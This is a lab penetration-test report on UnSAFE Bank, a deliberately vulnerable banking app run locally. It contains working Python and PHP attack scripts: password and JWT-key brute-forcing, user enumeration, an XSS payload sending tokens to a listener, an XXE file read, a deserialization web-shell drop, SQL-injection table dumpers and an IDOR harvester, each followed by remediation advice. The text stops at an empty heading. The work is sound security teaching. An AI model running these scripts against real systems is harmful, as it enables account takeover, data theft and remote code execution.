---
title: "UnSAFE Bank Pentesting Report"
date: "2025-07-07"
description: "Security assessment of a banking web app revealing critical flaws like brute-force, IDOR, and remote code execution"
technologies: ["Python", "Burp Suite", "Docker", "JWT", "MySQL", "PHP"]
---

![Logo](/Screenshots/unsafebank//installation/unsafe.jpg)
# I. Introduction

This report presents the results of a comprehensive black-box penetration test conducted against **UnSAFE Bank**, a deliberately insecure, **undocumented** banking application designed to emulate the complexities and security pitfalls of real-world financial platforms.

Deployed locally in a controlled lab environment, UnSAFE Bank features a modern multi-tier architecture: a React-based frontend, a PHP backend running on Apache with PHP-FPM, and a MySQL database. This full-stack setup mirrors common enterprise deployments and offers a broad attack surface across client-side, API, server-side, and database layers.

Unlike traditional CTF-style challenges, UnSAFE Bank is **poorly documented and no longer maintained**, presenting an additional layer of realism. The assessment was conducted from a **pure black-box perspective**, without access to source code or documentation. All vulnerabilities were identified through dynamic analysis, reverse engineering, and iterative probing.

This report documents:

- The methodology used to deploy, stabilize, and assess the environment.
    
- A step-by-step breakdown of critical vulnerabilities discovered — from broken authentication to remote code execution.
    
- Exploitation details supported by custom tooling.
    
- Realistic remediation recommendations based on modern web security practices.
    

The environment was set up on Kali Linux using Docker Compose, and all findings were reproduced in a fully isolated, reproducible lab setup to simulate real-world conditions as closely as possible.
# II. Installation and Troubleshooting

As UnSAFE Bank is an **unmaintained and undocumented** legacy project, deploying the application in a modern environment posed several challenges. This section outlines the steps taken to overcome build failures, adapt legacy dependencies, and ultimately achieve a functional testing environment.
### Initial Setup

The project was cloned and deployed using Docker Compose:

```bash
git clone https://github.com/lucideus-repo/UnSAFE_Bank.git
cd UnSAFE_Bank/Backend
docker-compose up -d
```

However, the initial build process failed due to a suppressed error originating from the frontend’s Dockerfile:

![yarn -s](/Screenshots/unsafebank//installation/err1.png)
### Debugging the Frontend Build

To gain visibility into the failure, I modified the `web/Dockerfile` by removing the `--silent` flag from the `yarn` command. This exposed the underlying issue more clearly:

![](/Screenshots/unsafebank//installation/err2.png)

The error stemmed from a failed dependency build using `node-gyp`, which typically requires native compilation tools.
### Fixing `node-gyp` Environment Errors

To resolve the compilation errors, I modified the Dockerfile to include system dependencies required by `node-gyp`, such as Python, Make, and g++:

```Dockerfile
# Install Python, make, g++ for node-gyp support
RUN apk add --no-cache python3 make g++ \
    && ln -sf python3 /usr/bin/python
```

### Resolving `node-sass` Compatibility Issues

After fixing the build environment, the next failure involved an incompatible version of `node-sass`. The project was attempting to use a version (`^7.0.0`) that was not compatible with the underlying Node version in the container.

To address this, I manually downgraded the `node-sass` dependency in `web/package.json`:

```json
"node-sass": "^4.14.1"
```

This version aligned with the legacy build toolchain and successfully compiled without errors.

### Final Deployment

After applying both fixes, I rebuilt the containers. The application launched successfully, and the web interface became accessible at `http://localhost:3000/`:

![](/Screenshots/unsafebank//installation/finally.png)  
![](/Screenshots/unsafebank//installation/interface.png)

### Takeaway

This multi-stage troubleshooting process highlights the challenges of maintaining vulnerable legacy applications, especially those with outdated toolchains and poor documentation. By applying targeted environment patches and dependency downgrades, I was able to restore full functionality — providing a solid foundation for black-box assessment.
# III. Web Application Tour

Navigating to `http://localhost:3000/`, we are greeted with a clean landing page that offers options to **Log In**, **Register**, and **Test Connection**.

To test connectivity, I entered `localhost` and port `80` in the prompt:

![](/Screenshots/unsafebank//tour/testconn.png)

Next, I tried registering an account to explore the app’s features.

![](/Screenshots/unsafebank//tour/register.png)

After registering, a success message appears along with a generated customer ID (`BNK07174`), which we’ll use for login.

![](/Screenshots/unsafebank//tour/bnkid.png)

Upon logging in, we're directed to the dashboard, where we’re greeted by name and shown our current account balance. Clicking the “My Account” button displays our registration details and allows editing them.

![](/Screenshots/unsafebank//tour/accinfo.png)  
![](/Screenshots/unsafebank//tour/edit.png)

The **Account Statement** section provides a history of our transactions.

![](/Screenshots/unsafebank//tour/stat.png)

Under the **Beneficiary** tab, we can view or add beneficiaries. Viewing displays dummy data, and clicking on a name shows additional details.

![](/Screenshots/unsafebank//tour/viewben.png)  
![](/Screenshots/unsafebank//tour/dav.png)

The Add Beneficiary form is straightforward:

![](/Screenshots/unsafebank//tour/addben.png)

The **Fund Transfer** section has two options: **Bank Transfer** and **Wallet Transfer**. The wallet feature is still under development.

![](/Screenshots/unsafebank//tour/banktrans.png)  
![](/Screenshots/unsafebank//tour/wallettrans.png)

The **Loans** tab allows users to apply for loans or view their loan history via simple forms:

![](/Screenshots/unsafebank//tour/applyloan.png)  
![](/Screenshots/unsafebank//tour/appliedloan.png)

In **Settings**, users can change their password using a basic update form:

![](/Screenshots/unsafebank//tour/changepass.png)

Lastly, we have the **Contact Us** and **About Us** pages, which are standard informational pages:

![](/Screenshots/unsafebank//tour/contact.png)  
![](/Screenshots/unsafebank//tour/about.png)

# VI. Pentesting

Now that the application is running and we’ve explored its features, it’s time to get to the fun part, **pentesting**. The first target I decided to assess was the **login page**...
### 1. Login Password Bruteforce:

During my assessment of this login page, initial manual testing involved submitting multiple incorrect credentials in rapid succession. The application consistently returned similar error messages and HTTP status codes, with no evidence of rate limiting, account lockout, or CAPTCHA enforcement. This suggested a potential vulnerability to brute-force attacks.

To confirm this, I created a dummy user account via the registration endpoint using the userID BNK86596 and a weak rockyou password: `softball`.Then I developed a Python script to automate login attempts using the well-known `rockyou.txt` password list. The script crafted POST requests with the appropriate JSON body structure expected by the API and iterated through the password list.

```python
import requests
import json

url = "http://localhost:80/api/login"
username = "BNK86596"
rockyou_path = "/usr/share/wordlists/rockyou.txt"

with open(rockyou_path, "r", encoding="latin-1") as f:
    wordlist = [line.strip() for line in f]

headers = {
    "Content-Type": "application/json"
}

for pwd in wordlist:
    payload = {
        "requestBody": {
            "timestamp": "325553",
            "device": {
                "deviceid": "UHDGGF735SVHFVSX",
                "os": "ios",
                "host": "lucideustech.com"
            },
            "data": {
                "userid": username,
                "passwd": pwd
            }
        }
    }

    resp = requests.post(url, headers=headers, data=json.dumps(payload))

    print(f"[{pwd}] -> {resp.status_code} | {resp.text[:100]}")

    if "token" in resp.text or "Login Successful" in resp.text:
        print(f"\n[+] SUCCESS: Password FOUND -> {pwd}")
        break
```

When I executed the script against the local Dockerized instance of the application, it quickly identified the correct password for the account within seconds. The server returned a valid response containing an authentication token, confirming that no account lockout or login attempt restrictions were in place. This validated that the authentication mechanism is vulnerable to brute-force attacks and exposes the system to credential stuffing or automated login attempts.

![](/Screenshots/unsafebank//pent/brute.png)

**Vulnerability Score:**  
This flaw rates around **CVSS 7.5 (High)** due to easy remote exploitation with no rate limiting or account lockout, allowing attackers to guess passwords rapidly.

**Remedy:**  
Implement rate limiting and temporary account lockouts after multiple failed attempts. Add CAPTCHA challenges and consider multi-factor authentication to prevent automated brute-force attacks. Also, enforce strong password policies and monitor login attempts for suspicious activity.

---
### 2. Users Enumeration:
Moving on to the password reset functionality exposed at `http://localhost:80/api/password/forgot`. The application leaks information about valid users based on the content of the response. Specifically, when submitting a request with a nonexistent `userid`, the server consistently returns a structured failure message: `"status": "Failed", "status_code": "PSW002", "message": "User not registered"`. However, when a valid user ID is submitted, the response differs, typically by returning an "OTP created" message. Combined with the absence of rate limiting, this response discrepancy allows for efficient and automated user enumeration.

To exploit this, I crafted a Python script to systematically send POST requests using user IDs in the format `BNK00000` through `BNK99999`, mimicking a 5-digit PIN scheme commonly used in financial applications. The request body adhered to the expected JSON structure, and each attempt was evaluated based on whether the response matched the known "User not registered" failure pattern. Any deviation was interpreted as a likely indication that the `BNK` ID exists in the application's database.

```python
import requests
import json

url = "http://localhost:80/api/password/forgot"
headers = {"Content-Type": "application/json"}

# Signature "not found" response
FAIL_SIGNATURE = {
    "status": "Failed",
    "status_code": "PSW002",
    "message": "User not registered"
}

results = []

for i in range(100000):  # 00000 to 99999
    bnk_id = f"BNK{i:05d}"
    payload = {
        "requestBody": {
            "timestamp": "325553",
            "device": {
                "deviceid": "UHDGGF735SVHFVSX",
                "os": "ios",
                "host": "lucideustech.com"
            },
            "data": {
                "userid": bnk_id,
                "otp_type": "4"
            }
        }
    }

    try:
        resp = requests.post(url, headers=headers, data=json.dumps(payload), timeout=3)
        data = resp.json()

        # Compare key fields of the failure signature
        if not (
            data.get("status") == FAIL_SIGNATURE["status"]
            and data.get("status_code") == FAIL_SIGNATURE["status_code"]
            and data.get("message") == FAIL_SIGNATURE["message"]
        ):
            print(f"[+] Found response for {bnk_id}: {data}")
            results.append((bnk_id, data))

    except Exception as e:
        print(f"Error for {bnk_id}: {e}")

# Save to file
if results:
    with open("valid_bnk_ids.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Saved {len(results)} valid entries to valid_bnk_ids.json")
else:
    print("\n[-] No valid BNK IDs found.")
```

This allowed me to programmatically enumerate valid bank account IDs without authentication, simply by exploiting predictable ID formats and weak feedback control in the API. The discovered IDs can be further leveraged in IDOR, phishing, or credential stuffing attacks against the application.

![](/Screenshots/unsafebank//pent/IdsLeak.png)

**Vulnerability Score:**  
This issue rates around **CVSS 6.5 (Medium-High)** due to information leakage that allows attackers to enumerate valid users remotely and easily.

**Remedy:**  
Standardize responses for both valid and invalid user IDs to avoid revealing user existence. Implement rate limiting on password reset requests and consider adding CAPTCHA to prevent automated enumeration attacks.

---
### 3. Password Reset OTPs:

Another critical issue discovered in the forgot password functionality is that once an attacker obtains a valid user ID, changing the password requires only an OTP that is directly displayed as a modal on the web page. This means there is **no secure delivery or verification of the OTP**, and it is exposed openly to anyone requesting it.

Using the previously obtained JSON file containing all user IDs, I was able to easily trigger password resets for any user by simply submitting their ID and retrieving the OTP from the response. This flaw effectively allows an attacker to compromise the entire user base without needing access to the users’ email or phone.

![](/Screenshots/unsafebank//pent/OTP.png)

**Vulnerability Score:**  
This is a **Critical issue (CVSS ~9.0)** because OTPs are exposed directly in the response, allowing attackers to bypass secure verification and reset passwords instantly.

**Remedy:**  
Never expose OTPs in API responses or on the client side. OTPs should be securely delivered via out-of-band channels (email, SMS) and verified server-side only. Implement proper OTP expiration, rate limiting, and logging to prevent abuse.

---
### 4. XSS Injection:

During testing on the signup page, I tried numerous XSS payloads across all input fields, but none succeeded. I wasn’t ready to give up though. After signing in, I noticed an option to edit user information—this opened a new attack surface. Injecting a simple HTML snippet like `<h1>aa</h1>` into the **location** field rendered successfully, confirming the input was not properly sanitized.

Next, I tested if script execution was possible. A straightforward `<script>alert(1)</script>` did not trigger, so I switched to using the `onerror` event on an image tag: `<img src=x onerror="alert(1)">`. This worked perfectly and confirmed the presence of an XSS vulnerability.

![](/Screenshots/unsafebank//pent/xss.png)

To escalate the impact, I attempted to exfiltrate the user token stored in localStorage to a webhook. Since the environment was local, I set up a simple Python HTTP server to capture incoming requests:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/s'):
            parsed_path = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed_path.query)

            if 'd' in query:
                data = query['d'][0]
                decoded = urllib.parse.unquote_plus(data)
                print(f"[!] Stolen data: {decoded}")

            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(
                b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xFF\xFF\xFF!'
                b'\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00'
                b'\x00\x02\x02D\x01\x00;'
            )
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):
    print(f"[*] Starting server on port {port}")
    httpd = server_class(('', port), handler_class)
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

Then, I inserted the payload `<img src=x onerror="fetch('http://localhost:8000/s?d='+localStorage.userData)">` into the location field.

![](/Screenshots/unsafebank//pent/xsstoken.png)

While this only sends our own user’s data in this testing environment, if the location field is ever rendered on sensitive pages like an admin dashboard or viewed by other users, this flaw would allow attackers to steal session tokens and fully compromise accounts.

**Vulnerability Score:**  
This is a **High severity issue (CVSS ~7.4)** because it allows arbitrary script execution, potentially leading to session theft and account compromise.

**Remedy:**  
Sanitize and properly encode all user inputs before rendering them on any page. Implement Content Security Policy (CSP) headers to limit script execution. Additionally, apply input validation and output encoding consistently across all user-editable fields.

---
### 5. Weak JWT Signature:

Another obvious yet dangerous vulnerability I found was while checking the local storage. It was the JWT token itself.

![](/Screenshots/unsafebank//pent/jwt.png)

First, I noted that it's storing way too much sensible information. However, the more critical issue was the weak signature protection on the token.

To test this, I attempted to brute-force the JWT signing key using a common password list. Using the following Python script, I was able to successfully recover the secret key protecting the JWT token’s signature.

```python
import jwt

jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhY2N0Tm8iOiI2OTUxMDIwMzc0OTIiLCJhY2N0QmFsYW5jZSI6IjYzNTE4Ni4xOCIsImluY29tZVRheE51bWJlciI6IjI1MjgzMjAyNTQiLCJhY2N0T3BlbmluZ0RhdGUiOiIyMDI1LTA3LTA0IDAwOjAwOjAwIiwiY3VycmVuY3kiOiJJTlIiLCJmbmFtZSI6ImFsaSIsImxuYW1lIjoiYWxpIiwiYWRkcmVzcyI6IjEsIGFhIiwiZG9iIjoiMjAwOC0wNi0yOSIsIm1vYmlsZU5vIjoiMTExMTExMTExMSIsImVtYWlsIjoiYWxpQG1haWwuY29tIiwiYWFkaGFySWQiOiIzMjMxMDgwNzU3NDAiLCJwYW5DYXJkSWQiOiI4Mzg2NTY1ODQ3Iiwid2FsbGV0SWQiOiI2MDAwMDY2NzU3IiwiZ2VuZGVyIjoiMSIsImNvdW50cnlJZCI6IklORCIsImV4cCI6MTc1MjI1Njc4N30.rXQawROYgPu6irdsp6bNBx01koH7lm6eWZfhY_iDDXo"

rockyou_path = "/usr/share/wordlists/rockyou.txt"

with open(rockyou_path, "r", errors="ignore") as f:
    for line in f:
        key = line.strip()
        try:
            decoded = jwt.decode(jwt_token, key, algorithms=["HS256"])
            print(f"[+] Key found: {key}")
            print(f"Decoded payload: {decoded}")
            break
        except jwt.exceptions.InvalidSignatureError:
            pass
        except Exception:
            pass
    else:
        print("[-] Key not found in rockyou.txt")
```

![](/Screenshots/unsafebank//pent/jwtcrack.png)

This is a **High severity issue (CVSS ~8.0)** because a weak or guessable JWT signing key allows attackers to forge valid tokens and impersonate users.

**Remedy:**  
Use a strong, random secret key for JWT signing, ideally at least 256 bits. Avoid exposing sensitive data inside JWT payloads. Also, implement short token expiration times and consider rotating keys regularly to minimize risk.

---
### 6. XXE:

While exploring the application, the **Contact Us** form attracted my attention. Initially, I tested it by sending JSON payloads, which the server accepted and processed correctly, confirming that the endpoint handles structured data.

Next, I wondered if the endpoint might also accept **XML** input. If it did, this would open the door to an **XXE attack**, where malicious XML can be crafted to read arbitrary files from the server.

![](/Screenshots/unsafebank//pent/xml.png)

As suspected, it got passed successfully. Time to inject a DTD for XXE. For this I wrote a simple python script.

```python
import requests

url = "http://localhost/api/contactUs"

payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>'''

headers = {
    "Content-Type": "application/xml",
    "Accept": "application/xml"
}

response = requests.post(url, data=payload.encode(), headers=headers)

print("Server Response:")
print(response.text)
```

![](/Screenshots/unsafebank//pent/xxe.png)

The server’s response included the contents of the `/etc/passwd` file, confirming the XXE vulnerability.

This exploit is significant because it allows reading arbitrary files on the server, potentially exposing sensitive information such as configuration files, credentials, or other data critical to the system’s security.

A possible explanation is when the backend received the XML payload with the external entity, it parsed the XML using a DOM parser configured to load external entities (`LIBXML_NOENT | LIBXML_DTDLOAD`). This caused the parser to resolve the `xxe` entity by reading the contents of the specified file (`/etc/passwd`) from the server’s filesystem and substitute it directly into the XML structure. Because the application then included this expanded XML content in its response without sanitization, the sensitive file contents were leaked, making the XXE attack successful.

**Vulnerability Score:**  
This is a **High severity issue (CVSS ~7.5)** since it allows an attacker to read arbitrary files on the server, potentially exposing sensitive data.

**Remedy:**  
Disable external entity processing in the XML parser. Validate and sanitize all XML inputs. Use less vulnerable data formats like JSON when possible, and apply strict input validation to prevent malicious XML payloads.

---
### 7. Web Shell

After spending hours exploring different parts of the application and trying various techniques, I eventually made a breakthrough on the loan application API. While analyzing the requests made when applying for a loan, I noticed that one of the fields—`type`—contained a Base64-encoded string. Curious, I decoded it and found that it was a serialized PHP object, specifically of the class `LogWrite`. This object held two properties: `logfile` and `logdata`.

![](/Screenshots/unsafebank//pent/carloan.png)

This immediately stood out as a potential entry point for PHP Object Injection (POI). Even without seeing the backend code, the presence of a serialized object being passed directly in a user-supplied field is a major red flag. It suggested that the backend might be blindly unserializing the input, which can be incredibly dangerous—especially if the class includes a magic method like `__destruct()` that gets automatically executed when the object goes out of scope.

From the name `LogWrite`, I guessed that this class might be responsible for logging activity, and perhaps writes the `logdata` property to a file. If this guess was correct, and the class lets us control both the file name (`logfile`) and its contents (`logdata`), then in theory we could write arbitrary PHP code to a file somewhere in the web root—effectively planting a web shell.

To test this, I crafted a serialized payload locally using PHP, embedding a classic web shell into the `logdata` and setting `logfile` to something like `../../../shell.php` in hopes of reaching the web root. Here's the script I used:

```php
<?php
class LogWrite
{
    public $logfile = null;
    public $logdata = null;

    public function __construct($logfile, $logdata)
    {
        if ($logfile !== "") {
            $this->logfile = $logfile;
        }
        $this->logdata = $logdata;
    }
}

$object = new LogWrite("../../../shell.php", "<?php system(\$_GET['cmd']); ?>");
$serialized = serialize($object);
$base64 = base64_encode($serialized);

echo $base64 . "\n";
?>
```

I then replaced the original Base64 string in the loan request with this new one using Burp Suite, submitted the modified request, and got a success response—no errors, no rejections.

![](/Screenshots/unsafebank//pent/rev.png)

![](/Screenshots/unsafebank//pent/loansucc.png)

Now the moment of truth: I visited `http://localhost/shell.php?cmd=ls`. If everything had worked, this should execute the `ls` command on the server and return the result. And it did.

![](/Screenshots/unsafebank//pent/shellsucc.png)

By chaining together the clues, an unusual Base64 string in the payload, signs of deserialization, and the assumption that the class might write logs to disk, we were able to escalate this into full remote code execution. This is a textbook case of insecure deserialization leading to a file write primitive, ultimately resulting in a web shell.

**Vulnerability Score:**  
This is a **Critical vulnerability (CVSS ~9.8)** due to remote code execution risk via insecure deserialization and arbitrary file write.

**Remedy:**  
Avoid unserializing untrusted user input. Implement strict input validation and use safer data formats like JSON. Disable PHP object deserialization where not necessary, or use hardened libraries that prevent object injection. Restrict file write permissions and sanitize file paths to prevent arbitrary file creation.

---
### 8. SQL Injection (SQLi)

After nearly giving up hope, I finally discovered my first SQL injection vulnerability while exploring the "View Beneficiary" feature. Upon selecting a beneficiary, the application sent a POST request to `/api/beneficiary/fetch`:

```json
{
  "requestBody": {
    "timestamp": "325553",
    "device": {
      "deviceid": "UHDGGF735SVHFVSX",
      "os": "ios",
      "host": "lucideustech.com"
    },
    "data": {
      "alias": "Orion"
    }
  }
}
```

The request relies on the `alias` field to fetch beneficiary details, suggesting that the backend issues a SQL query like:

```sql
SELECT ... FROM alias_table WHERE alias = '$alias'
```

Naturally, I tried injecting a basic payload:  
`' OR 1=1--`  
and was greeted with a raw SQL error:

![](/Screenshots/unsafebank//pent/sqlerror.png)

The error message:

> `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\n AND user_id_fk = 11' at line 9`

This revealed two critical insights:

1. **SQL injection is confirmed** — the input is reaching the SQL interpreter unsanitized.
    
2. **Standard payloads break due to newline characters** — simple `--` or `#` comments are ineffective because the SQL query seems to be injected mid-line or across multiple lines, and the newline isn't properly handled.
    
This makes the injection slightly more complex. Rather than relying on comment-based termination, I had to craft payloads that properly balance or close quotes and ensure the final query remains syntactically valid.

After confirming the SQL injection point, I didn’t want to stop at just an error disclosure. To make the most out of this vulnerability, I aimed to perform a **UNION-based attack** to extract data from other tables. Simply finding a SQL error and moving on would’ve been too superficial.

My first step was figuring out how many columns were being returned by the vulnerable query. Based on the response structure — which included four fields like `Alias`, `Account Number`, `IFSC Code`, and `Added Date` — I assumed it was returning **four columns**.

To confirm, I injected a classic payload:

```
' UNION SELECT NULL,NULL,NULL,NULL
```

As expected, this threw an error. To address that, I slightly modified the payload:

```
' UNION SELECT NULL,NULL,NULL,NULL WHERE '1'='1
```

That worked. But then, I hit a new error:

> `Unknown column 'user_id_fk' in 'field list'`

This told me that the original query expected a `user_id_fk` column to be returned, likely used internally to filter the original response. Since my `UNION SELECT` payload didn’t include it, the SQL engine complained. But the error still confirmed the column count (4) and hinted at internal logic.

```sql
UNION SELECT table_name AS user_id_fk, NULL, NULL, NULL FROM information_schema.tables WHERE '1'='
```

Here, I aliased `table_name` as `user_id_fk` to satisfy the query’s expectations.

However, it **still** threw the same error:

> `Unknown column 'user_id_fk' in 'field list'`

#### Why the error?

It turns out that SQL evaluates the `WHERE` clause **before** the `SELECT`. That means:

- When the database processes `WHERE user_id_fk = ...`, it's looking for a **real column** named `user_id_fk` in the source table (`information_schema.tables`).
    
- But `user_id_fk` is **just an alias** created later in the `SELECT`, so it doesn't exist yet.
    
- Hence, the engine throws `Unknown column 'user_id_fk' in 'field list'`.
    

At this point, I was getting pretty frustrated. But then it clicked. The SQL query probably looks like this.

```sql
SELECT a, b, c, d FROM x WHERE a = '<payload>' AND user_id_fk = 13
```

And these four columns were clearly rendered in the frontend like this:

![](/Screenshots/unsafebank//tour/dav.png)

#### The Strategy

The goal became clear: if I could manipulate the SQL to look like this...

```sql
SELECT a, b, c, d FROM x WHERE a = '' -- a,b,c,d being the original but unknown columns selected
UNION -- Payload starts here
SELECT target, NULL, NULL, NULL FROM target_table
UNION
SELECT NULL, NULL, NULL, NULL FROM x WHERE '1' = 'payload ends here' AND user_id_fk = x
```

...then I’d be able to **blend malicious data with legit results**, and the system would just render it like any valid record.

Now, I wanted to treat this as a black box challenge — so I couldn't just open up the source. I only had to guess the table name that contains user_id_fk column for this to work and not throw an error.

After some guessing, the table name was simply `beneficiary_details`.

```sql
UNION (SELECT table_name, NULL, NULL, NULL FROM information_schema.tables LIMIT 1 OFFSET 0) 
UNION 
SELECT NULL, NULL, NULL, NULL FROM beneficiary_details WHERE '1'='
```

Which returned:

```json
{"alias":"account_details","accountNumber":null,"ifscCode":null,"creationDateTime":null}
```

Since the backend query only returns **a single row**, we can iterate through results by adding `LIMIT 1 OFFSET x` to our `UNION` payload — with `x` being the row index. This allows us to chain the attack and dump any table in the database, one row at a time.

here’s a Python script that automates this process and gets all the table names:

```python
import requests
import json

# Target URL and headers
url = "http://localhost/api/beneficiary/fetch"

headers = {
    "Authorization": [JWT TOKEN HERE]
}

offset = 0
output_file = "table_names.txt"

print("[*] Starting extraction loop...\n")

with open(output_file, "w") as f:
    while True:
        payload = {
            "requestBody": {
                "timestamp": "325553",
                "device": {
                    "deviceid": "UHDGGF735SVHFVSX",
                    "os": "ios",
                    "host": "lucideustech.com"
                },
                "data": {
                    "alias": f"' UNION (SELECT table_name, NULL, NULL, NULL FROM information_schema.tables LIMIT 1 OFFSET {offset}) UNION  SELECT NULL, NULL, NULL, NULL FROM beneficiary_details WHERE '1'='"
                }
            }
        }

        response = requests.post(url, headers=headers, json=payload)

        try:
            result = response.json()
        except json.JSONDecodeError:
            print(f"[!] Non-JSON response at offset {offset}")
            break

        status = result.get("status")
        data = result.get("data", {})

        if status == "Failed":
            print(f"\n[-] Stopped at offset {offset}: No more rows or invalid payload.")
            break

        alias = data.get("alias")
        if alias:
            print(f"[+] Offset {offset}: {alias}")
            f.write(alias + "\n")
        else:
            print(f"[!] Offset {offset} returned no alias.")

        offset += 1
```

![](/Screenshots/unsafebank//pent/tables_sqli.png)

And this code should mimic a SELECT * FROM a target table:

```python
import requests
import json

# === Input ===
target_table = input("Enter target table name: ").strip()
output_file = f"{target_table}_rows.txt"

# === Constants ===
url = "http://localhost/api/beneficiary/fetch"

headers = {
    "Authorization": [JWT TOKEN HERE]
}

# === Step 1: Fetch column names ===
print(f"\n[*] Fetching columns for table '{target_table}'")
columns = []
offset = 0

while True:
    injected_alias = f"' UNION (SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = '{target_table}' LIMIT 1 OFFSET {offset}) UNION  SELECT NULL, NULL, NULL, NULL FROM beneficiary_details WHERE '1'='"

    payload = {
        "requestBody": {
            "timestamp": "325553",
            "device": {
                "deviceid": "UHDGGF735SVHFVSX",
                "os": "ios",
                "host": "lucideustech.com"
            },
            "data": {
                "alias": injected_alias
            }
        }
    }

    res = requests.post(url, headers=headers, json=payload)

    try:
        result = res.json()
    except:
        print("[!] Column fetch failed.")
        break

    if result.get("status") == "Failed":
        break

    col = result.get("data", {}).get("alias")
    if col:
        print(f"[+] Found column: {col}")
        columns.append(col)
        offset += 1
    else:
        break

if not columns:
    print("[-] No columns found.")
    exit()

print(f"[✔] Total columns found: {len(columns)}\n")

# === Step 2: Dump row data column-by-column ===
print(f"[*] Extracting row-wise data from '{target_table}'...\n")
row_offset = 0
row_file = open(output_file, "w")

while True:
    row_data = []

    for col in columns:
        injected_alias = f"' UNION (SELECT {col}, NULL, NULL, NULL FROM {target_table} LIMIT 1 OFFSET {row_offset}) UNION SELECT NULL, NULL, NULL, NULL FROM beneficiary_details WHERE '1'='"
        payload["requestBody"]["data"]["alias"] = injected_alias
        res = requests.post(url, headers=headers, json=payload)

        try:
            result = res.json()
        except:
            print(f"[!] JSON error at row offset {row_offset}, column '{col}'")
            break

        if result.get("status") == "Failed":
            print(f"[-] No more data at offset {row_offset}")
            row_file.close()
            print(f"\n[✔] Extraction complete. Saved to: {output_file}")
            exit()

        value = result.get("data", {}).get("alias", "")
        row_data.append(value)

    print(f"[+] Row {row_offset}: {row_data}")
    row_file.write(",".join(row_data) + "\n")
    row_offset += 1
```

![](/Screenshots/unsafebank//pent/select.png)

**Vulnerability Score:**  
This is a **Critical vulnerability (CVSS ~9.0)** due to unauthenticated remote SQL injection allowing data extraction and potential full database compromise.

**Remedy:**  
Use parameterized queries (prepared statements) to prevent injection. Avoid directly inserting user input into SQL statements. Implement strict input validation and error handling to prevent detailed error disclosure. Limit database user privileges and monitor for suspicious query activity.

---
### 9. Insecure Direct Object Reference (IDOR)

During the assessment of the **My Account** page, I identified an IDOR vulnerability in the API request responsible for fetching account details. Instead of relying solely on the secure `BNKID` embedded within the JWT token for authorization, the endpoint accepts a user-controlled `userid` in the POST request payload to retrieve account information.

This flaw allows unauthorized access to any user’s account details simply by modifying the `userid` value in the JSON request.

![](/Screenshots/unsafebank//pent/IDOR.png)
#### Exploiting IDOR at scale

We already have a method to enumerate the user base via the **Forgot Password** page. However, if that avenue were unavailable, this vulnerability provides an alternative means to retrieve user IDs. Notably, the endpoint lacks any form of rate limiting, allowing unrestricted automated enumeration. The following Python script automates this process by:

- Generating sequential `BNK` IDs,
    
- Querying the vulnerable endpoint concurrently,
    
- Collecting valid user details,
    
- Saving the results incrementally to a JSON file.
    

```python
import requests
import json
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Configuration ---
URL = "http://localhost/api/account/details"
OUTPUT_FILE = "valid_account_details.json"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "[JWT TOKEN HERE]"
}
MAX_THREADS = 4

valid_results = []

def build_payload(bnk_id):
    return {
        "requestBody": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": {
                "userid": bnk_id
            }
        }
    }

def check_user(index):
    bnk_id = f"BNK{index:05d}"
    try:
        response = requests.post(URL, headers=HEADERS, json=build_payload(bnk_id), timeout=5)
        if response.status_code != 200:
            return None
        data = response.json()
        if data.get("status") == "Success" and data.get("status_code") == "ACT002":
            print(f"[+] VALID: {bnk_id} → {data['data']['fname']} {data['data']['lname']}")
            return data["data"]
    except Exception as e:
        print(f"[ERROR] {bnk_id}: {e}")
    return None

print(f"[*] Starting user enumeration with {MAX_THREADS} threads...\n")

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    futures = [executor.submit(check_user, i) for i in range(100000)]
    for future in as_completed(futures):
        user_data = future.result()
        if user_data:
            valid_results.append(user_data)
            with open(OUTPUT_FILE, "w") as f:
                json.dump(valid_results, f, indent=2)

print(f"\n[✓] Enumeration complete. Found {len(valid_results)} valid accounts.")
print(f"[✓] Results saved to {OUTPUT_FILE}.")
```

This exploit demonstrates how an IDOR vulnerability, when combined with predictable identifiers, can be scaled to harvest sensitive data across the entire user base, emphasizing the critical need for robust authorization checks tied strictly to authenticated sessions rather than user-supplied input.

**Vulnerability Score:**  
This is a **High to Critical issue (CVSS ~8.0)** because it allows unauthorized access to sensitive user data by manipulating user-controlled parameters.

**Remedy:**  
Enforce strict authorization checks on the server side, ensuring users can only access their own data based on the authenticated identity (e.g., from the JWT token). Avoid relying on client-supplied identifiers for access control. Implement rate limiting and logging to detect abuse.

---
### 10. Fake Old Password Verification

While reviewing the password update functionality, I discovered a critical vulnerability: the application **does not verify the correctness of the current password before allowing a user to update it**.

Although the frontend form includes a “Current Password” input field (as shown below), the backend fails to validate its contents. Submitting **any value** in this field — including completely incorrect or random text — will still result in a **successful password change**, as long as the user is authenticated.

This effectively means that **once a user logs into their account, they can change their password without knowing their current one**, removing an important security barrier against session hijacking, token theft, and similar post-authentication attacks.

![](/Screenshots/unsafebank//pent/passverif.png)

**Vulnerability Score:**  
This is a **High severity issue (CVSS ~7.5)** because it allows authenticated attackers to change passwords without proving knowledge of the current one, increasing risk of account takeover.

**Remedy:**  
Ensure the backend verifies the current password before allowing a password change. The server must reject updates if the provided current password is incorrect, regardless of frontend behavior. Implement additional checks such as MFA for sensitive changes.

---
### 11. OTP Bruteforce Vulnerability

